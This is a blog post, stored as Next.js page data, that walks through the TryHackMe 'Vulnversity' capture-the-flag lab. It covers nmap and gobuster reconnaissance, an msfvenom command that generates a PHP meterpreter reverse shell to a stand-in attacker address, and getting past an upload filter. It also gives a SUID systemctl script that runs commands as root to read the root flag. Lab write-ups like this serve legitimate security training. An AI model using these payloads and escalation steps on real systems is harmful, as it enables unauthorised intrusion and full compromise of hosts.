1:HL["/_next/static/css/ce86090a857d0a37.css",{"as":"style"}]
0:[[["",{"children":["posts",{"children":[["path","2020-09-02_tryhackme_vulnversity","d"],{"children":["__PAGE__?{\"path\":\"2020-09-02_tryhackme_vulnversity\"}",{}]}]}]},"$undefined","$undefined",true],"$L2",[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/ce86090a857d0a37.css","precedence":"next"}]],["$L3",null]]]]
4:HL["/_next/static/css/2a1840b1c557e13c.css",{"as":"style"}]
2:["$L5",null]
3:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"/dev/blog - /dev/blog - TryHackMe - Vulnversity"}],["$","meta",null,{"name":"description","content":"Learn about active recon, web app attacks and privilege escalation."}],["$","meta",null,{"name":"application-name","content":"/dev/blog"}],null,null,["$","meta",null,{"name":"generator","content":"Next.js"}],["$","meta",null,{"name":"keywords","content":"Dev,Blog,Programmings"}],["$","meta",null,{"name":"referrer","content":"origin-when-cross-origin"}],[["$","meta",null,{"name":"theme-color","content":"amber"}]],["$","meta",null,{"name":"color-scheme","content":"dark"}],["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta",null,{"name":"creator","content":"Joshua Chapman"}],null,null,null,null,null,null,null,null,null,[]],[["$","link",null,{"rel":"canonical","href":"https://joshuachp.dev/posts/2020-09-02_tryhackme_vulnversity"}],null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.svg","type":"image/svg+xml"}],["$","link",null,{"rel":"icon","href":"/favicon.png","type":"image/png"}],["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}]],[],null]]
6:I{"id":"3508","chunks":["920:static/chunks/920-79b25866a09062bb.js","185:static/chunks/app/layout-bf6323bd5651a252.js"],"name":"","async":false}
7:I{"id":"247","chunks":["920:static/chunks/920-79b25866a09062bb.js","185:static/chunks/app/layout-bf6323bd5651a252.js"],"name":"","async":false}
8:I{"id":"3495","chunks":["920:static/chunks/920-79b25866a09062bb.js","185:static/chunks/app/layout-bf6323bd5651a252.js"],"name":"","async":false}
9:I{"id":"4463","chunks":["272:static/chunks/webpack-8bd999e5067c7888.js","667:static/chunks/2443530c-52b0a2f58ac02a84.js","488:static/chunks/488-c7775bdaa3bbbd30.js"],"name":"","async":false}
a:I{"id":"1010","chunks":["272:static/chunks/webpack-8bd999e5067c7888.js","667:static/chunks/2443530c-52b0a2f58ac02a84.js","488:static/chunks/488-c7775bdaa3bbbd30.js"],"name":"","async":false}
5:["$","html",null,{"lang":"en","children":[["$","head",null,{"children":[["$","$L6",null,{"production":true,"goatCounterApi":"a7d98e3f-b56b"}],["$","script",null,{"id":"dark-theme","dangerouslySetInnerHTML":{"__html":"if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')&&window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}"}}]]}],["$","body",null,{"className":"bg-primary-50 dark:bg-primary-900","children":["$","$L7",null,{"children":[["$","$L8",null,{}],["$","main",null,{"className":"flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96","children":["$","$L9",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$La",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","childProp":{"current":["$","$L9",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$La",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","childProp":{"current":["$","$L9",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["path","2020-09-02_tryhackme_vulnversity","d"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$La",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","childProp":{"current":["$Lb",null],"segment":"__PAGE__?{\"path\":\"2020-09-02_tryhackme_vulnversity\"}"},"styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/2a1840b1c557e13c.css","precedence":"next"}]]}],"segment":["path","2020-09-02_tryhackme_vulnversity","d"]},"styles":[]}],"segment":"posts"},"styles":[]}]}]]}]}]]}]
c:I{"id":"8920","chunks":["920:static/chunks/920-79b25866a09062bb.js","563:static/chunks/app/posts/[path]/page-cdf4a6bc5b13017d.js"],"name":"","async":false}
d:I{"id":"8451","chunks":["920:static/chunks/920-79b25866a09062bb.js","563:static/chunks/app/posts/[path]/page-cdf4a6bc5b13017d.js"],"name":"","async":false}
b:["$","article",null,{"className":"flex max-w-full grow flex-col justify-self-start","children":[["$","h1",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl","children":[["$","span","1",{"children":"TryHackMe - Vulnversity"}]]}],["$","blockquote","11",{"children":[["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","5",{"children":"The room link can be found at"}],"\r\n",["$","$Lc",null,{"title":"","className":"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600","href":"https://tryhackme.com/room/vulnversity","children":[["$","span","8",{"children":"TryHackMe - Vulnversity"}]]}]]}]]}],["$","h2",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl","children":[["$","span","13",{"children":"Reconnaissance"}]]}],["$","h3",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl","children":[["$","span","16",{"children":"Nmap"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","19",{"children":"First, we do a simple Nmap scan"}]]}],["$","$Ld","23",{"language":"sh","className":"mb-4 mt-2","children":[["$","span","22",{"children":"nmap $IP\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3128/tcp open  squid-http\n3333/tcp open  dec-notes\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","25",{"children":"We find six ports open, we can now make a more in-depth scan with"}],"\r\n",["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"nmap -sC -sV $IP"}],["$","span","28",{"children":". It will found the service type and version."}]]}],["$","$Ld","32",{"language":"sh","className":"mb-4 mt-2","children":[["$","span","31",{"children":"nmap -sC -sV $IP\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 3.0.3\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)\n|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)\n|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n3128/tcp open  http-proxy  Squid http proxy 3.5.12\n|_http-server-header: squid/3.5.12\n|_http-title: ERROR: The requested URL could not be retrieved\n3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Vuln University\nService Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s\n|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: vulnuniversity\n|   NetBIOS computer name: VULNUNIVERSITY\\x00\n|   Domain name: \\x00\n|   FQDN: vulnuniversity\n|_  System time: 2020-09-02T14:44:45-04:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-09-02T18:44:46\n|_  start_date: N/A\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","34",{"children":"From the OpenSSH version we can find out that the os type is Ubuntu Linux."}]]}],["$","h3",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl","children":[["$","span","37",{"children":"Gobuster"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","40",{"children":"There is an HTTP port open on "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"3333"}],["$","span","42",{"children":" so we can start enumerating it."}]]}],["$","$Ld","46",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","45",{"children":"gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.232.204:3333/\n[+] Threads:        10\n[+] Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/09/02 20:52:40 Starting gobuster\n===============================================================\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/css (Status: 301)\n/fonts (Status: 301)\n/images (Status: 301)\n/internal (Status: 301)\n/js (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2020/09/02 20:56:58 Finished\n===============================================================\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","48",{"children":"We can see various pages. Visiting them we find that on "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"/internal"}],["$","span","50",{"children":" there is an"}],"\r\n",["$","span","52",{"children":"upload form."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","55",{"children":"If we run gobuster again on this path we can find a second directory"}],"\r\n",["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"/internal/uploads/"}],["$","span","58",{"children":"."}]]}],["$","h2",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl","children":[["$","span","61",{"children":"Exploitation"}]]}],["$","h3",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl","children":[["$","span","64",{"children":"Compromise the webserver"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","67",{"children":"We start by generating our reverse shell. I chose to use a meterpreter reverse"}],"\r\n",["$","span","69",{"children":"shell."}]]}],["$","$Ld","73",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","72",{"children":"msfvenom --payload php/meterpreter/reverse_tcp  LHOST=$USER_IP LPORT=$PORT > payload.php\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","75",{"children":"Let"}],["$","span","76",{"children":"â€™"}],["$","span","77",{"children":"s also start the Metasploit console with an "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"exploit/multi/handler"}],["$","span","79",{"children":"."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","82",{"children":"Unfortunately if we try to upload it the extension is blocked. If we try the"}],"\r\n",["$","span","84",{"children":"extensions provided in the image from the challenge, we find that one works. We"}],"\r\n",["$","span","86",{"children":"can find the uploaded file in the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"/internal/uploads/"}],["$","span","88",{"children":" directory that we found"}],"\r\n",["$","span","90",{"children":"before."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","93",{"children":"We now have a shell on the box."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","96",{"children":"Now we background the session and use the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"post/linux/gather/enum_system"}],["$","span","98",{"children":" to"}],"\r\n",["$","span","100",{"children":"enumerate the system information, including the user accounts. With the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"loot"}],"\r\n",["$","span","103",{"children":"command, we can list the gathered items, and at the end of there user list, we"}],"\r\n",["$","span","105",{"children":"have the "}],["$","strong","108",{"children":[["$","span","107",{"children":"bill"}]]}],["$","span","109",{"children":" user. In his home directory, we can find the user flag which"}],"\r\n",["$","span","111",{"children":"is readable by "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"www-data"}],["$","span","113",{"children":" (our user)."}]]}],["$","h3",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl","children":[["$","span","116",{"children":"Privilege escalation"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","119",{"children":"To gather more information about the box, we can use the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"upload"}],["$","span","121",{"children":" command to"}],"\r\n",["$","span","123",{"children":"upload the"}],"\r\n",["$","$Lc",null,{"title":"","className":"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600","href":"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS","children":[["$","span","126",{"children":"linPEAS"}]]}],"\r\n",["$","span","129",{"children":"script. This will list all the interesting information on the box, including"}],"\r\n",["$","span","131",{"children":"the SUID binaries. Une of them sticks out, the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"systemctl"}],["$","span","133",{"children":" executable that bad"}],"\r\n",["$","span","135",{"children":"since we can execute and change the state of all the services on the machine"}],"\r\n",["$","span","137",{"children":"without root privilege. We look up"}],"\r\n",["$","$Lc",null,{"title":"","className":"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600","href":"https://gtfobins.github.io/gtfobins/systemctl/","children":[["$","span","140",{"children":"systemctl | GTFOBins"}]]}],["$","span","142",{"children":" to find"}],"\r\n",["$","span","144",{"children":"an easy way to exploit it."}]]}],["$","$Ld","148",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","147",{"children":"#!/bin/sh\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"cat /root/root.txt > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsystemctl link $TF\nsystemctl enable --now $TF\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","150",{"children":"This script will create a temp service file, link, enable, and run it. The"}],"\r\n",["$","span","152",{"children":"service will be run as root and will cat the flag into the tmp directory that"}],"\r\n",["$","span","154",{"children":"is readable for us. We could also run a meterpreter reverse shell to gain a"}],"\r\n",["$","span","156",{"children":"root shell on the box."}]]}]]}]
